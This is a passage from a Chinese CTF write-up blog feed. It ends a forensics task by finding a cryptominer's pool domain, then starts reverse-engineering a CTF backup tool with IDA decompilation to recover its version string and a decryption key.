<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task9-1">task9<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task9-1" class="hash-link" aria-label="task9的直接链接" title="task9的直接链接">​</a></h3>
<blockquote>
<ol>
<li>该挖矿程序回连的矿池域名是什么? 示例: <code>www.baidu.com</code></li>
</ol>
</blockquote>
<p>攻击者直接请求了挖矿程序的配置文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241107-000706-d0cfaa93545d6debcc71d18dc884ffd8.png" width="1711" height="1436" class="img_ev3q"></p>
<p>在其中找到以下记录</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">"url": "auto.skypool.xyz:4444"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. auto.skypool.xyz</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>陈橘mo</name>
            <uri>https://randark.site</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Incident-Response" term="Incident-Response"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[2024 数信杯 - 场景赛 - 数据备份]]></title>
        <id>https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb Scenario-Race Data-Backup</id>
        <link href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb Scenario-Race Data-Backup"/>
        <updated>2024-11-09T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[2024 数信杯 - 数据安全综合场景赛 - 数据备份 题目分析]]></summary>
        <content type="html"><![CDATA[<p>2024 数信杯 - 数据安全综合场景赛 - 数据备份 题目分析</p>
<p>首先，服务器的环境没有任何作用，核心都在服务器上获取的两个样本</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">myback</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">202410311935.cbak</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>附件可以在 <a href="https://github.com/CTF-Archives/2024-shuxincup/releases/download/v0.1/Data-Backup.zip" target="_blank" rel="noopener noreferrer">Release 附件下载 - Data-Backup.zip · CTF-Archives/2024-shuxincup</a> 获取得到</p>
<p>一个是备份工具，一个是执行备份之后得到的被破坏的备份文件</p>
<p>首先，先尝试执行一下备份工具</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241116-211626-a2eecc60e1307fc7de371229f85ae3e8.png" width="1084" height="797" class="img_ev3q"></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~/tmp/2024sxb-1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ./myback</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Menu:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1. Backup File</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. Restore Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3. Print Info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4. Exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>那么，根据比赛时的题目先完成一下题目</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-版本信息">1. 版本信息<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb%20Scenario-Race%20Data-Backup#1-%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF" class="hash-link" aria-label="1. 版本信息的直接链接" title="1. 版本信息的直接链接">​</a></h2>
<blockquote>
<p>请选手分析备份恢复系统中的备份工具 myback 程序，获取备份工具的版本信息。</p>
<p>版本信息为一串类似 <code>***.***.***</code> 的字符串，注意星号不具有占位意义，不代表具体的字符串长度。</p>
<p>【答案标准】例：若获取的版本信息为：123.456.789，则提交的 案为：123.456.789。</p>
</blockquote>
<p>第一种做法，可以直接执行程序来获得</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~/tmp/2024sxb-1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ./myback</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Menu:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1. Backup File</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. Restore Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3. Print Info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4. Exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter your choice: 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Bcakup_programe version:3.85.4h6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This program is used for backing up and restoring files.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Choose 1 to back up files in the specified directory to the current program directory and output a cbak file.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Choose 2 to restore the specified backup file to the current program directory.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>第二种方法，用 IDA 直接逆向分析</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> __fastcall </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">envp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> choice</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+14h] [rbp-Ch] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int64 v5</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+18h] [rbp-8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v5 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__readfsqword</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x28u</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Menu:"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"1. Backup File"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"2. Restore Files"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"3. Print Info"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"4. Exit"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Enter your choice:"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">__isoc99_scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"%d"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">choice</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">choice </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Exiting program."</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">choice</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">goto</span><span class="token plain"> LABEL_11</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">switch</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">choice</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">case</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">print_info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">case</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Please enter the path of the directory to be backed up:"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">__isoc99_scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"%s"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> backup_file_dir</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">backup_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_dir</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">case</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Please enter the backup file name to be restored:"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">__isoc99_scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"%s"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> restore_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">restore_files</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">restore_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">default</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LABEL_11</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Invalid choice. Please try again."</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一个简单的菜单逻辑，跟进 <code>print_info()</code> 函数</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> __cdecl </span><span class="token function" style="color:#d73a49">print_info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Bcakup_programe version:%s\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"3.85.4h6"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"This program is used for backing up and restoring files."</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Choose 1 to back up files in the specified directory to the current program directory and output a cbak file."</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Choose 2 to restore the specified backup file to the current program directory."</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同样可以得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">3.85.4h6</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-解密的密钥">2. 解密的密钥<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb%20Scenario-Race%20Data-Backup#2-%E8%A7%A3%E5%AF%86%E7%9A%84%E5%AF%86%E9%92%A5" class="hash-link" aria-label="2. 解密的密钥的直接链接" title="2. 解密的密钥的直接链接">​</a></h2>
<blockquote>
<p>请选手分析备份恢复系统中的备份恢复工具 myback 中的备份 / 恢复逻辑，找到用于解密的密钥。</p>
<p>【答案标准】例：若找到用于解密的密钥为字符串 123456。则提交最终 案为：123456。</p>
</blockquote>
<p>题目要求的是解密算法的密钥，那么解密常见于 restore 功能，即基于菜单逻辑跟进 <code>restore_files()</code> 函数</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> __cdecl </span><span class="token function" style="color:#d73a49">restore_files</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">backup_file_path</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    __int64 v1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rdx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    restore_files</span><span class="token operator" style="color:#393A34">::</span><span class="token plain">FileInfo </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">v2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rax</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    __int64 v3</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rbx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    __int64 v4</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// rbx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+10h] [rbp-E0h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> offseta</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+10h] [rbp-E0h]</span><span class="token 